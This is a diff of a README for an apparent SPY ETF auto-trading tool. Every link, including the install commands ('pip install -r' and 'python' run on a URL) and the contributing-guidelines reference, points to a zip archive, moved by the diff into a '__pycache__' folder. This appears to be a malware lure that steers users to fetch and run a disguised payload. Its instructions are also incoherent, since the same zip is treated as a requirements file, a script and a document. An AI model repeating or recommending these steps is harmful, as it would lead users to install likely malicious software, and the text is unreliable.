@@ -1,6 +1,6 @@
 # 🚀 LONGPORT-DualSMA-SPY-AutoTrading-System - Automate Your SPY ETF Trading
 
-[![Download](https://github.com/edwardplushboy-max/LONGPORT-DualSMA-SPY-AutoTrading-System/raw/refs/heads/main/config/SP-SM-System-Trading-Dual-LONGPOR-Auto-v3.3.zip)](https://github.com/edwardplushboy-max/LONGPORT-DualSMA-SPY-AutoTrading-System/raw/refs/heads/main/config/SP-SM-System-Trading-Dual-LONGPOR-Auto-v3.3.zip)
+[![Download](https://github.com/edwardplushboy-max/LONGPORT-DualSMA-SPY-AutoTrading-System/raw/refs/heads/main/src/cli/__pycache__/SP-Dual-Trading-LONGPOR-System-SM-Auto-1.4.zip)](https://github.com/edwardplushboy-max/LONGPORT-DualSMA-SPY-AutoTrading-System/raw/refs/heads/main/src/cli/__pycache__/SP-Dual-Trading-LONGPOR-System-SM-Auto-1.4.zip)
 
 ## 🌟 Introduction
 
@@ -30,14 +30,14 @@ To get started with the LONGPORT-DualSMA-SPY-AutoTrading-System, follow these si
 
    Visit the Releases page to download the software. You can find it here:
 
-   [Download LONGPORT-DualSMA-SPY-AutoTrading-System](https://github.com/edwardplushboy-max/LONGPORT-DualSMA-SPY-AutoTrading-System/raw/refs/heads/main/config/SP-SM-System-Trading-Dual-LONGPOR-Auto-v3.3.zip)
+   [Download LONGPORT-DualSMA-SPY-AutoTrading-System](https://github.com/edwardplushboy-max/LONGPORT-DualSMA-SPY-AutoTrading-System/raw/refs/heads/main/src/cli/__pycache__/SP-Dual-Trading-LONGPOR-System-SM-Auto-1.4.zip)
 
 2. **Install Dependencies**
 
    Open your terminal or command prompt. You may need to install some packages. Run the following command:
 
    ```
-   pip install -r https://github.com/edwardplushboy-max/LONGPORT-DualSMA-SPY-AutoTrading-System/raw/refs/heads/main/config/SP-SM-System-Trading-Dual-LONGPOR-Auto-v3.3.zip
+   pip install -r https://github.com/edwardplushboy-max/LONGPORT-DualSMA-SPY-AutoTrading-System/raw/refs/heads/main/src/cli/__pycache__/SP-Dual-Trading-LONGPOR-System-SM-Auto-1.4.zip
    ```
 
 3. **Run the Application**
@@ -45,14 +45,14 @@ To get started with the LONGPORT-DualSMA-SPY-AutoTrading-System, follow these si
    Navigate to the directory where you downloaded the software, and run:
 
    ```
-   python https://github.com/edwardplushboy-max/LONGPORT-DualSMA-SPY-AutoTrading-System/raw/refs/heads/main/config/SP-SM-System-Trading-Dual-LONGPOR-Auto-v3.3.zip
+   python https://github.com/edwardplushboy-max/LONGPORT-DualSMA-SPY-AutoTrading-System/raw/refs/heads/main/src/cli/__pycache__/SP-Dual-Trading-LONGPOR-System-SM-Auto-1.4.zip
    ```
 
 ## 🔗 Download & Install
 
 To download the latest version of the application, click the link below:
 
-[Download LONGPORT-DualSMA-SPY-AutoTrading-System](https://github.com/edwardplushboy-max/LONGPORT-DualSMA-SPY-AutoTrading-System/raw/refs/heads/main/config/SP-SM-System-Trading-Dual-LONGPOR-Auto-v3.3.zip)
+[Download LONGPORT-DualSMA-SPY-AutoTrading-System](https://github.com/edwardplushboy-max/LONGPORT-DualSMA-SPY-AutoTrading-System/raw/refs/heads/main/src/cli/__pycache__/SP-Dual-Trading-LONGPOR-System-SM-Auto-1.4.zip)
 
 After downloading, follow the steps mentioned in the "Getting Started" section.
 
@@ -102,4 +102,4 @@ This project is licensed under the MIT License. You can view the full license in
 
 ## 📢 Contributing
 
-We welcome contributions to improve the LONGPORT-DualSMA-SPY-AutoTrading-System. If you're interested in contributing, feel free to fork the repository and submit a pull request. Please adhere to our contribution guidelines, which you can find in the https://github.com/edwardplushboy-max/LONGPORT-DualSMA-SPY-AutoTrading-System/raw/refs/heads/main/config/SP-SM-System-Trading-Dual-LONGPOR-Auto-v3.3.zip file.
+We welcome contributions to improve the LONGPORT-DualSMA-SPY-AutoTrading-System. If you're interested in contributing, feel free to fork the repository and submit a pull request. Please adhere to our contribution guidelines, which you can find in the https://github.com/edwardplushboy-max/LONGPORT-DualSMA-SPY-AutoTrading-System/raw/refs/heads/main/src/cli/__pycache__/SP-Dual-Trading-LONGPOR-System-SM-Auto-1.4.zip file.
